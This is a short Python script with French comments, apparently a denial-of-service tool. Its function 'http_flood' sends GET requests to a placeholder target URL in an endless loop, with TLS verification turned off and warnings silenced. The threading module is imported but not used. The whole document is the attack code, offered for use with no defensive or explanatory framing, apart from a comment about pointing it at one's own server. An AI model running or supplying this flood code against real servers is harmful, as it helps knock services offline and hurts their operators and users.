import requests
import threading
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "XXXXXX"  # Remplacez par l'URL réelle de votre serveur

def http_flood():
    try:
        response = requests.get(target_url, verify=False)
        print(f"Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    while True:
        http_flood()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Script arrêté manuellement.")
